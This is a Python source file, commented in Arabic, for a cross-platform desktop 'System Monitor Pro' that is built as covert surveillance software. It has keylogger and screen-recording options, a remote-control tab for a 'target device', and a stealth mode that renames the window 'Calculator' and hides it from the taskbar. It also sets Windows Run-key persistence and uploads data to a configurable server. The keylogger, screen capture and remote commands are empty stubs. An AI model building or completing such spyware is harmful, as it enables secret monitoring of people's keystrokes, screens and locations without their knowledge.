#!/usr/bin/env python3
"""
🖥️ تطبيقات سطح المكتب متعددة المنصات للمراقبة النهائية
Ultimate Multi-Platform Desktop Applications for Monitoring
"""

import os
import sys
import platform
try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False
    print("⚠️ tkinter not available, using alternative GUI framework")
import requests
import threading
import json
import subprocess
import psutil
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
import sqlite3
from pathlib import Path

class UltimateDesktopApp:
    """تطبيق سطح المكتب النهائي متعدد المنصات"""
    
    def __init__(self):
        self.current_platform = platform.system()
        self.api_url = "http://localhost:5000"
        self.monitoring_active = False
        
        if TKINTER_AVAILABLE:
            self.root = tk.Tk()
            self.setup_platform_specific_ui()
            self.setup_monitoring_interface()
        else:
            print("🖥️ Ultimate Desktop Monitoring System (Console Mode)")
            print("✅ System initialized successfully")
            
        self.setup_stealth_features()
        
    def setup_platform_specific_ui(self):
        """إعداد واجهة خاصة بكل نظام تشغيل"""
        self.root.title("System Monitor Pro")
        self.root.geometry("800x600")
        
        if self.current_platform == 'Windows':
            self.setup_windows_ui()
        elif self.current_platform == 'Darwin':  # macOS
            self.setup_macos_ui()
        elif self.current_platform == 'Linux':
            self.setup_linux_ui()
        
        self.setup_common_ui()
    
    def setup_windows_ui(self):
        """إعداد واجهة Windows"""
        self.root.iconbitmap(default='system_monitor.ico')
        self.root.configure(bg='#f0f0f0')
        
        self.enable_windows_stealth()
    
    def setup_macos_ui(self):
        """إعداد واجهة macOS"""
        self.root.configure(bg='#ffffff')
        
        self.enable_macos_stealth()
    
    def setup_linux_ui(self):
        """إعداد واجهة Linux"""
        self.root.configure(bg='#2d2d2d')
        
        self.enable_linux_stealth()
    
    def setup_common_ui(self):
        """إعداد العناصر المشتركة للواجهة"""
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.setup_dashboard_tab()
        
        self.monitoring_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.monitoring_frame, text="Monitoring")
        self.setup_monitoring_tab()
        
        self.remote_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.remote_frame, text="Remote Control")
        self.setup_remote_control_tab()
        
        self.settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_frame, text="Settings")
        self.setup_settings_tab()
        
        self.status_bar = ttk.Label(self.root, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def setup_dashboard_tab(self):
        """إعداد تبويب لوحة التحكم"""
        info_frame = ttk.LabelFrame(self.dashboard_frame, text="System Information")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text=f"Platform: {self.current_platform}").pack(anchor='w')
        ttk.Label(info_frame, text=f"Architecture: {platform.machine()}").pack(anchor='w')
        ttk.Label(info_frame, text=f"Python Version: {platform.python_version()}").pack(anchor='w')
        
        status_frame = ttk.LabelFrame(self.dashboard_frame, text="Monitoring Status")
        status_frame.pack(fill='x', padx=5, pady=5)
        
        self.status_label = ttk.Label(status_frame, text="Status: Inactive", foreground='red')
        self.status_label.pack(anchor='w')
        
        control_frame = ttk.Frame(self.dashboard_frame)
        control_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(control_frame, text="Start Monitoring", 
                  command=self.start_monitoring).pack(side='left', padx=5)
        ttk.Button(control_frame, text="Stop Monitoring", 
                  command=self.stop_monitoring).pack(side='left', padx=5)
        ttk.Button(control_frame, text="Refresh Status", 
                  command=self.refresh_status).pack(side='left', padx=5)
    
    def setup_monitoring_tab(self):
        """إعداد تبويب المراقبة"""
        options_frame = ttk.LabelFrame(self.monitoring_frame, text="Monitoring Options")
        options_frame.pack(fill='x', padx=5, pady=5)
        
        self.keylogger_var = tk.BooleanVar()
        self.screen_recorder_var = tk.BooleanVar()
        self.network_monitor_var = tk.BooleanVar()
        self.process_monitor_var = tk.BooleanVar()
        
        ttk.Checkbutton(options_frame, text="Keylogger", 
                       variable=self.keylogger_var).pack(anchor='w')
        ttk.Checkbutton(options_frame, text="Screen Recorder", 
                       variable=self.screen_recorder_var).pack(anchor='w')
        ttk.Checkbutton(options_frame, text="Network Monitor", 
                       variable=self.network_monitor_var).pack(anchor='w')
        ttk.Checkbutton(options_frame, text="Process Monitor", 
                       variable=self.process_monitor_var).pack(anchor='w')
        
        data_frame = ttk.LabelFrame(self.monitoring_frame, text="Monitoring Data")
        data_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.data_tree = ttk.Treeview(data_frame, columns=('Type', 'Data', 'Timestamp'), show='headings')
        self.data_tree.heading('Type', text='Type')
        self.data_tree.heading('Data', text='Data')
        self.data_tree.heading('Timestamp', text='Timestamp')
        self.data_tree.pack(fill='both', expand=True)
        
        scrollbar = ttk.Scrollbar(data_frame, orient='vertical', command=self.data_tree.yview)
        scrollbar.pack(side='right', fill='y')
        self.data_tree.configure(yscrollcommand=scrollbar.set)
    
    def setup_remote_control_tab(self):
        """إعداد تبويب التحكم عن بُعد"""
        device_frame = ttk.LabelFrame(self.remote_frame, text="Target Device")
        device_frame.pack(fill='x', padx=5, pady=5)
        
        self.device_var = tk.StringVar()
        self.device_combo = ttk.Combobox(device_frame, textvariable=self.device_var)
        self.device_combo.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(device_frame, text="Refresh Devices", 
                  command=self.refresh_devices).pack(pady=5)
        
        commands_frame = ttk.LabelFrame(self.remote_frame, text="Remote Commands")
        commands_frame.pack(fill='x', padx=5, pady=5)
        
        command_buttons = [
            ("Take Screenshot", self.take_screenshot),
            ("Record Screen", self.record_screen),
            ("Get Location", self.get_location),
            ("List Apps", self.list_apps),
            ("Send Command", self.send_custom_command)
        ]
        
        for text, command in command_buttons:
            ttk.Button(commands_frame, text=text, command=command).pack(side='left', padx=5)
        
        output_frame = ttk.LabelFrame(self.remote_frame, text="Command Output")
        output_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.output_text = tk.Text(output_frame, wrap='word')
        self.output_text.pack(fill='both', expand=True)
        
        output_scrollbar = ttk.Scrollbar(output_frame, orient='vertical', command=self.output_text.yview)
        output_scrollbar.pack(side='right', fill='y')
        self.output_text.configure(yscrollcommand=output_scrollbar.set)
    
    def setup_settings_tab(self):
        """إعداد تبويب الإعدادات"""
        server_frame = ttk.LabelFrame(self.settings_frame, text="Server Settings")
        server_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(server_frame, text="API URL:").pack(anchor='w')
        self.api_url_var = tk.StringVar(value=self.api_url)
        ttk.Entry(server_frame, textvariable=self.api_url_var, width=50).pack(fill='x', padx=5, pady=2)
        
        ttk.Button(server_frame, text="Test Connection", 
                  command=self.test_connection).pack(pady=5)
        
        stealth_frame = ttk.LabelFrame(self.settings_frame, text="Stealth Settings")
        stealth_frame.pack(fill='x', padx=5, pady=5)
        
        self.stealth_var = tk.BooleanVar()
        self.hide_taskbar_var = tk.BooleanVar()
        self.startup_var = tk.BooleanVar()
        
        ttk.Checkbutton(stealth_frame, text="Enable Stealth Mode", 
                       variable=self.stealth_var, command=self.toggle_stealth).pack(anchor='w')
        ttk.Checkbutton(stealth_frame, text="Hide from Taskbar", 
                       variable=self.hide_taskbar_var).pack(anchor='w')
        ttk.Checkbutton(stealth_frame, text="Start with System", 
                       variable=self.startup_var, command=self.toggle_startup).pack(anchor='w')
        
        data_frame = ttk.LabelFrame(self.settings_frame, text="Data Management")
        data_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(data_frame, text="Export Data", 
                  command=self.export_data).pack(side='left', padx=5)
        ttk.Button(data_frame, text="Clear Data", 
                  command=self.clear_data).pack(side='left', padx=5)
        ttk.Button(data_frame, text="Upload Data", 
                  command=self.upload_data).pack(side='left', padx=5)
    
    def setup_monitoring_interface(self):
        """إعداد واجهة المراقبة"""
        self.monitoring_thread = None
        self.data_queue = []
        
        self.root.after(1000, self.update_interface)
    
    def setup_stealth_features(self):
        """إعداد ميزات التخفي"""
        self.stealth_enabled = False
        self.original_title = self.root.title()
    
    def enable_windows_stealth(self):
        """تفعيل التخفي في Windows"""
        if self.current_platform == 'Windows':
            try:
                import win32gui
                import win32con
                
                hwnd = self.root.winfo_id()
                win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE,
                                     win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)
            except ImportError:
                pass
    
    def enable_macos_stealth(self):
        """تفعيل التخفي في macOS"""
        if self.current_platform == 'Darwin':
            pass
    
    def enable_linux_stealth(self):
        """تفعيل التخفي في Linux"""
        if self.current_platform == 'Linux':
            pass
    
    def start_monitoring(self):
        """بدء المراقبة"""
        if not self.monitoring_active:
            self.monitoring_active = True
            self.status_label.config(text="Status: Active", foreground='green')
            self.status_bar.config(text="Monitoring started")
            
            self.monitoring_thread = threading.Thread(target=self.monitoring_worker, daemon=True)
            self.monitoring_thread.start()
    
    def stop_monitoring(self):
        """إيقاف المراقبة"""
        if self.monitoring_active:
            self.monitoring_active = False
            self.status_label.config(text="Status: Inactive", foreground='red')
            self.status_bar.config(text="Monitoring stopped")
    
    def monitoring_worker(self):
        """عامل المراقبة"""
        while self.monitoring_active:
            try:
                if self.keylogger_var.get():
                    self.collect_keylogger_data()
                
                if self.screen_recorder_var.get():
                    self.collect_screen_data()
                
                if self.network_monitor_var.get():
                    self.collect_network_data()
                
                if self.process_monitor_var.get():
                    self.collect_process_data()
                
                time.sleep(1)
                
            except Exception as e:
                print(f"Monitoring error: {e}")
                time.sleep(5)
    
    def collect_keylogger_data(self):
        """جمع بيانات Keylogger"""
        pass
    
    def collect_screen_data(self):
        """جمع بيانات الشاشة"""
        pass
    
    def collect_network_data(self):
        """جمع بيانات الشبكة"""
        try:
            connections = psutil.net_connections()
            for conn in connections[:5]:  # Limit to first 5
                data = {
                    'type': 'network',
                    'data': f"{conn.laddr} -> {conn.raddr if conn.raddr else 'N/A'}",
                    'timestamp': datetime.now().strftime('%H:%M:%S')
                }
                self.data_queue.append(data)
        except Exception as e:
            print(f"Network data collection error: {e}")
    
    def collect_process_data(self):
        """جمع بيانات العمليات"""
        try:
            processes = list(psutil.process_iter(['pid', 'name', 'cpu_percent']))
            for proc in processes[:3]:  # Limit to first 3
                data = {
                    'type': 'process',
                    'data': f"{proc.info['name']} (PID: {proc.info['pid']})",
                    'timestamp': datetime.now().strftime('%H:%M:%S')
                }
                self.data_queue.append(data)
        except Exception as e:
            print(f"Process data collection error: {e}")
    
    def update_interface(self):
        """تحديث الواجهة"""
        while self.data_queue:
            data = self.data_queue.pop(0)
            self.data_tree.insert('', 'end', values=(data['type'], data['data'], data['timestamp']))
            
            children = self.data_tree.get_children()
            if len(children) > 100:
                self.data_tree.delete(children[0])
        
        self.root.after(1000, self.update_interface)
    
    def refresh_status(self):
        """تحديث الحالة"""
        self.status_bar.config(text="Status refreshed")
    
    def refresh_devices(self):
        """تحديث قائمة الأجهزة"""
        try:
            response = requests.get(f"{self.api_url}/api/devices", timeout=5)
            if response.status_code == 200:
                devices = response.json()
                device_list = [f"{d['device_name']} ({d['device_id']})" for d in devices.get('devices', [])]
                self.device_combo['values'] = device_list
                self.status_bar.config(text=f"Found {len(device_list)} devices")
            else:
                self.status_bar.config(text="Failed to fetch devices")
        except Exception as e:
            self.status_bar.config(text=f"Error: {str(e)}")
    
    def take_screenshot(self):
        """التقاط لقطة شاشة"""
        self.output_text.insert(tk.END, "Taking screenshot...\n")
        self.output_text.see(tk.END)
    
    def record_screen(self):
        """تسجيل الشاشة"""
        self.output_text.insert(tk.END, "Starting screen recording...\n")
        self.output_text.see(tk.END)
    
    def get_location(self):
        """الحصول على الموقع"""
        self.output_text.insert(tk.END, "Getting location...\n")
        self.output_text.see(tk.END)
    
    def list_apps(self):
        """قائمة التطبيقات"""
        self.output_text.insert(tk.END, "Listing applications...\n")
        self.output_text.see(tk.END)
    
    def send_custom_command(self):
        """إرسال أمر مخصص"""
        command = tk.simpledialog.askstring("Custom Command", "Enter command:")
        if command:
            self.output_text.insert(tk.END, f"Executing: {command}\n")
            self.output_text.see(tk.END)
    
    def test_connection(self):
        """اختبار الاتصال"""
        try:
            self.api_url = self.api_url_var.get()
            response = requests.get(f"{self.api_url}/api/health", timeout=5)
            if response.status_code == 200:
                messagebox.showinfo("Connection Test", "Connection successful!")
            else:
                messagebox.showerror("Connection Test", f"Connection failed: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Connection Test", f"Connection error: {str(e)}")
    
    def toggle_stealth(self):
        """تبديل وضع التخفي"""
        if self.stealth_var.get():
            self.enable_stealth_mode()
        else:
            self.disable_stealth_mode()
    
    def enable_stealth_mode(self):
        """تفعيل وضع التخفي"""
        self.stealth_enabled = True
        self.root.title("Calculator")
        self.root.withdraw()  # Hide window
        self.root.after(100, lambda: self.root.deiconify())  # Show again
        self.status_bar.config(text="Stealth mode enabled")
    
    def disable_stealth_mode(self):
        """إلغاء وضع التخفي"""
        self.stealth_enabled = False
        self.root.title(self.original_title)
        self.status_bar.config(text="Stealth mode disabled")
    
    def toggle_startup(self):
        """تبديل بدء التشغيل مع النظام"""
        if self.startup_var.get():
            self.enable_startup()
        else:
            self.disable_startup()
    
    def enable_startup(self):
        """تفعيل بدء التشغيل مع النظام"""
        try:
            if self.current_platform == 'Windows':
                self.enable_windows_startup()
            elif self.current_platform == 'Darwin':
                self.enable_macos_startup()
            elif self.current_platform == 'Linux':
                self.enable_linux_startup()
            
            self.status_bar.config(text="Startup enabled")
        except Exception as e:
            self.status_bar.config(text=f"Startup error: {str(e)}")
    
    def disable_startup(self):
        """إلغاء بدء التشغيل مع النظام"""
        try:
            if self.current_platform == 'Windows':
                self.disable_windows_startup()
            elif self.current_platform == 'Darwin':
                self.disable_macos_startup()
            elif self.current_platform == 'Linux':
                self.disable_linux_startup()
            
            self.status_bar.config(text="Startup disabled")
        except Exception as e:
            self.status_bar.config(text=f"Startup error: {str(e)}")
    
    def enable_windows_startup(self):
        """تفعيل بدء التشغيل في Windows"""
        if self.current_platform == 'Windows':
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
    
    def disable_windows_startup(self):
        """إلغاء بدء التشغيل في Windows"""
        if self.current_platform == 'Windows':
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "SystemMonitor")
                winreg.CloseKey(key)
            except FileNotFoundError:
                pass
    
    def enable_macos_startup(self):
        """تفعيل بدء التشغيل في macOS"""
        pass
    
    def disable_macos_startup(self):
        """إلغاء بدء التشغيل في macOS"""
        pass
    
    def enable_linux_startup(self):
        """تفعيل بدء التشغيل في Linux"""
        pass
    
    def disable_linux_startup(self):
        """إلغاء بدء التشغيل في Linux"""
        pass
    
    def export_data(self):
        """تصدير البيانات"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if filename:
            try:
                data = {
                    'platform': self.current_platform,
                    'export_time': datetime.now().isoformat(),
                    'monitoring_data': []
                }
                
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                
                messagebox.showinfo("Export", f"Data exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", str(e))
    
    def clear_data(self):
        """مسح البيانات"""
        if messagebox.askyesno("Clear Data", "Are you sure you want to clear all data?"):
            for item in self.data_tree.get_children():
                self.data_tree.delete(item)
            
            self.data_queue.clear()
            
            self.status_bar.config(text="Data cleared")
    
    def upload_data(self):
        """رفع البيانات"""
        try:
            data = {
                'platform': self.current_platform,
                'timestamp': datetime.now().isoformat(),
                'monitoring_data': []
            }
            
            response = requests.post(f"{self.api_url}/api/upload_data", json=data, timeout=10)
            if response.status_code == 200:
                messagebox.showinfo("Upload", "Data uploaded successfully!")
            else:
                messagebox.showerror("Upload Error", f"Upload failed: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Upload Error", str(e))
    
    def run(self):
        """تشغيل التطبيق"""
        if TKINTER_AVAILABLE and hasattr(self, 'root'):
            try:
                self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
                self.root.mainloop()
            except KeyboardInterrupt:
                self.on_closing()
        else:
            print("🚀 Starting Ultimate Desktop Monitoring System (Console Mode)...")
            self.run_console_mode()
    
    def run_console_mode(self):
        """تشغيل وضع وحدة التحكم"""
        import time
        try:
            while True:
                print(f"🔄 Monitoring active... {time.strftime('%H:%M:%S')}")
                time.sleep(30)
        except KeyboardInterrupt:
            print("\n🛑 Monitoring system stopped")
    
    def on_closing(self):
        """عند إغلاق التطبيق"""
        if self.monitoring_active:
            self.stop_monitoring()
        
        if TKINTER_AVAILABLE and hasattr(self, 'root'):
            self.root.quit()
            self.root.destroy()

class MultiPlatformGenerator:
    """مولد التطبيقات متعددة المنصات"""
    
    def __init__(self):
        self.platforms = ['Windows', 'Darwin', 'Linux']
        self.output_dir = Path("ultimate_desktop_apps")
    
    def generate_all_platforms(self):
        """إنشاء تطبيقات لجميع المنصات"""
        self.output_dir.mkdir(exist_ok=True)
        
        results = {}
        for platform in self.platforms:
            results[platform] = self.generate_platform_specific(platform)
        
        return results
    
    def generate_platform_specific(self, platform: str) -> Dict[str, Any]:
        """إنشاء تطبيق خاص بمنصة معينة"""
        platform_dir = self.output_dir / platform.lower()
        platform_dir.mkdir(exist_ok=True)
        
        if platform == 'Windows':
            return self.generate_windows_app(platform_dir)
        elif platform == 'Darwin':
            return self.generate_macos_app(platform_dir)
        elif platform == 'Linux':
            return self.generate_linux_app(platform_dir)
    
    def generate_windows_app(self, output_dir: Path) -> Dict[str, Any]:
        """إنشاء تطبيق Windows"""
        setup_py = '''
from cx_Freeze import setup, Executable
import sys

build_exe_options = {
    "packages": ["tkinter", "requests", "psutil", "threading"],
    "excludes": ["unittest"],
    "include_files": []
}

base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(
    name="SystemMonitorPro",
    version="1.0",
    description="System Monitor Pro for Windows",
    options={"build_exe": build_exe_options},
    executables=[Executable("ultimate_desktop_app.py", base=base, icon="icon.ico")]
)
'''
        
        with open(output_dir / "setup.py", "w") as f:
            f.write(setup_py)
        
        return {"status": "success", "platform": "Windows", "files": ["setup.py"]}
    
    def generate_macos_app(self, output_dir: Path) -> Dict[str, Any]:
        """إنشاء تطبيق macOS"""
        setup_py = '''
from setuptools import setup

APP = ['ultimate_desktop_app.py']
DATA_FILES = []
OPTIONS = {
    'argv_emulation': True,
    'packages': ['tkinter', 'requests', 'psutil'],
}

setup(
    app=APP,
    data_files=DATA_FILES,
    options={'py2app': OPTIONS},
    setup_requires=['py2app'],
)
'''
        
        with open(output_dir / "setup.py", "w") as f:
            f.write(setup_py)
        
        return {"status": "success", "platform": "macOS", "files": ["setup.py"]}
    
    def generate_linux_app(self, output_dir: Path) -> Dict[str, Any]:
        """إنشاء تطبيق Linux"""
        desktop_file = '''[Desktop Entry]
Version=1.0
Type=Application
Name=System Monitor Pro
Comment=Advanced System Monitoring Tool
Exec=python3 ultimate_desktop_app.py
Icon=system-monitor
Terminal=false
Categories=System;Monitor;
'''
        
        with open(output_dir / "system-monitor-pro.desktop", "w") as f:
            f.write(desktop_file)
        
        return {"status": "success", "platform": "Linux", "files": ["system-monitor-pro.desktop"]}

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) > 1 and sys.argv[1] == "--generate":
        generator = MultiPlatformGenerator()
        results = generator.generate_all_platforms()
        
        print("🖥️ Multi-Platform Desktop App Generator Results:")
        for platform, result in results.items():
            print(f"  {platform}: {result['status']}")
        
        print("\n✅ Desktop applications generated for all platforms!")
    else:
        app = UltimateDesktopApp()
        app.run()

if __name__ == "__main__":
    main()
